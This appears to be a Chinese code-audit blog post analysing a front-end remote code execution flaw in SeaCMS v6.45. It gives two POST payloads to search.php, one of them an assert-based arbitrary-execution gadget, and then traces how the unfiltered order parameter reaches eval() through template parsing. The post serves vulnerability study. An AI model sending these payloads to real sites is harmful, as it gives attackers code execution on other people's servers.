---
title: SeaCMS v6.45前台代码执行漏洞分析
date: 2018-08-06 23:13:22
tags:
	- 代码审计
	- 代码执行
---

SeaCMS没有使用框架，比较适合练习。

<!-- more -->

### 1. 源码下载

```
链接：https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw

密码：cd48
```

### 2. POC

第一种

```
http://127.0.0.1/seacms/search.php
POST:searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
```

第二种

```
http://127.0.0.1/seacms/search.php
POST:searchtype=5&order=}{end if} {if:1)print_r($_POST[a]($_POST[b]));//}{end if}&a=assert&b=phpinfo();
```

效果图

![](https://image.mengsec.com/18-8-6/49244924.jpg)

### 3. 漏洞原理分析

#### 3.1 代码执行简单流程

![](https://image.mengsec.com/18-8-6/81792070.jpg)

#### 3.2 详细分析

代码执行的原因是`$order`参数没做严格的限制，就将其传入了模板文件中，然后使用`eval()`执行模板中包含`$order`的代码。

 首先，在文件`seacms/search.php`中，包含了文件`seacms/include/common.php`,在`common.php`中第45-48行，将GET,POST等请求传入的全局变量中的键值对转换成变量，并对其中的值使用`addslashes()`进行处理。

```php
function _RunMagicQuotes(&$svar)
{
	if(!get_magic_quotes_gpc())
	{
		if( is_array($svar) )
		{
			foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);
		}
		else
		{
			$svar = addslashes($svar); # 转义单引号、双引号、反斜线、NULL
		}
	}
	return $svar;
}
foreach(Array('_GET','_POST','_COOKIE') as $_request)
{
	foreach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);
}
```

然后在`seacms/search.php`文件的`echoSearchPage()`函数中，也就是文件第63行，将变量注册成全局变量。

```
global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
```

可以看到，在`search.php`中，执行`echoSearchPage()`函数之前，没有对`$order`变量进行处理。

接着往下看，在`echoSearchPage()`函数中，使用`$searchtype`来选择使用的模板文件。

```
if(intval($searchtype)==5)
	{
		$searchTemplatePath = "/templets/".$GLOBALS['cfg_df_style']."/".$GLOBALS['cfg_df_html']."/cascade.html";
		$typeStr = !empty($tid)?intval($tid).'_':'0_';
		$yearStr = !empty($year)?PinYin($year).'_':'0_';
		$letterStr = !empty($letter)?$letter.'_':'0_';
		$areaStr = !empty($area)?PinYin($area).'_':'0_';
		$orderStr = !empty($order)?$order.'_':'0_';
		$jqStr = !empty($jq)?$jq.'_':'0_';
		$cacheName="parse_cascade_".$typeStr.$yearStr.$letterStr.$areaStr.$orderStr;
		$pSize = getPageSizeOnCache($searchTemplatePath,"cascade","");
	}else
	{
		if($cfg_search_time&&$page==1) checkSearchTimes($cfg_search_time);
		$searchTemplatePath = "/templets/".$GLOBALS['cfg_df_style']."/".$GLOBALS['cfg_df_html']."/search.html";
		$cacheName="parse_search_";
		$pSize = getPageSizeOnCache($searchTemplatePath,"search","");
	}
```

当值是5时，会使用`cascade.html`，文件目录为`seacms\templets\default\html\cascade.html`，若不是，则会使用`earch.html`，文件目录为`seacms\templets\default\html\search.html`。

下面153行，将模板文件读取到`$content`变量中，接着在155-173行替换标签。其中第158行使用`$order`替换了模板中`{searchpage:ordername}`标签。然后分别搜索`search.html`和`cascade.html`，只有`cascade.html`第79-81行存在该标签。

```
<a href="{searchpage:order-time-link}" {if:"{searchpage:ordername}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
<a href="{searchpage:order-hit-link}" {if:"{searchpage:ordername}"=="hit"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderaddtime">最近热播</a>
<a href="{searchpage:order-score-link}" {if:"{searchpage:ordername}"=="score"} class="btn btn-success" {else} class="btn btn-default" {end if} id="ordergold">评分最高</a>
```

因此，必须要`$searchtype==5`。

接着往下走，在第212行

```
$content=$mainClassObj->parseIf($content);
```

跟进去，在`seacms\include\main.class.php`中第3098-3147行中。

```
function parseIf($content)
{
    if (strpos($content, '{if:') === false) {
        return $content;
    } else {
        $labelRule = buildregx("{if:(.*?)}(.*?){end if}", "is");
        $labelRule2 = "{elseif";
        $labelRule3 = "{else}";
        preg_match_all($labelRule, $content, $iar);
        $arlen = count($iar[0]);
        $elseIfFlag = false;
        for ($m = 0; $m < $arlen; $m++) {
            $strIf = $iar[1][$m];
            $strIf = $this->parseStrIf($strIf);
            $strThen = $iar[2][$m];
            $strThen = $this->parseSubIf($strThen);
            if (strpos($strThen, $labelRule2) === false) {
                if (strpos($strThen, $labelRule3) >= 0) {
                    $elsearray = explode($labelRule3, $strThen);
                    $strThen1 = $elsearray[0];
                    $strElse1 = $elsearray[1];
                    @eval("if(" . $strIf . "){\$ifFlag=true;}else{\$ifFlag=false;}");
                    if ($ifFlag) {
                        $content = str_replace($iar[0][$m], $strThen1, $content);
                    } else {
                        $content = str_replace($iar[0][$m], $strElse1, $content);
                    }
                } else {
                    @eval("if(" . $strIf . ") { \$ifFlag=true;} else{ \$ifFlag=false;}");
                    if ($ifFlag) {
                        $content = str_replace($iar[0][$m], $strThen, $content);
                    } else {
                        $content = str_replace($iar[0][$m], "", $content);
                    }
                }
            } else {
                $elseIfArray = explode($labelRule2, $strThen);
                $elseIfArrayLen = count($elseIfArray);
                $elseIfSubArray = explode($labelRule3, $elseIfArray[$elseIfArrayLen - 1]);
                $resultStr = $elseIfSubArray[1];
                $elseIfArraystr0 = addslashes($elseIfArray[0]);
                @eval("if({$strIf}){\$resultStr=\"{$elseIfArraystr0}\";}");
                for ($elseIfLen = 1; $elseIfLen < $elseIfArrayLen; $elseIfLen++) {
                    $strElseIf = getSubStrByFromAndEnd($elseIfArray[$elseIfLen], ":", "}", "");
                    $strElseIf = $this->parseStrIf($strElseIf);
                    $strElseIfThen = addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen], "}", "", "start"));
                    @eval("if(" . $strElseIf . "){\$resultStr=\"{$strElseIfThen}\";}");
                    @eval("if(" . $strElseIf . "){\$elseIfFlag=true;}else{\$elseIfFlag=false;}");
                    if ($elseIfFlag) {
                        break;
                    }
                }
                $strElseIf0 = getSubStrByFromAndEnd($elseIfSubArray[0], ":", "}", "");
                $strElseIfThen0 = addslashes(getSubStrByFromAndEnd($elseIfSubArray[0], "}", "", "start"));
                if (strpos($strElseIf0, '==') === false && strpos($strElseIf0, '=') > 0) {
                    $strElseIf0 = str_replace('=', '==', $strElseIf0);
                }
                @eval("if(" . $strElseIf0 . "){\$resultStr=\"{$strElseIfThen0}\";\$elseIfFlag=true;}");
                $content = str_replace($iar[0][$m], $resultStr, $content);
            }
        }
        return $content;
    }
}
```

可以看到下面存在`eval()`函数来执行代码，要想进入到`eval()`，`$content`中必须含有`{if:`字符串。

然后是正则，

```
$labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");
preg_match_all($labelRule,$content,$iar);
```

看代码执行流程，在`eval()`函数中，`$strIf`就是之前`preg_match_all()`中第一个`(.*?)`匹配出来的值。

```
@eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
```

在`eval()`中，要闭合前面的if语句，可以构造`1)phpinfo();if(1`，又要符合正则`{if:(.*?)}(.*?){end if}`，再看标签：

```
<a href="{searchpage:order-time-link}" {if:"{searchpage:ordername}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
```

由于`$order`替换的是`{searchpage:ordername}`，所以，在`1)phpinfo();if(1`基础上添加。

```
}{end if}{if:1)phpinfo();if(1}{end if}
```

漏洞利用的基本流程就是这样，简单来说，就是有个可控的变量没有经过过滤，就被带入了`eval()`中，导致了代码执行。

###  4. 参考

[SeaCMS v6.45前台Getshell 代码执行 ](https://github.com/SecWiki/CMS-Hunter/tree/master/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)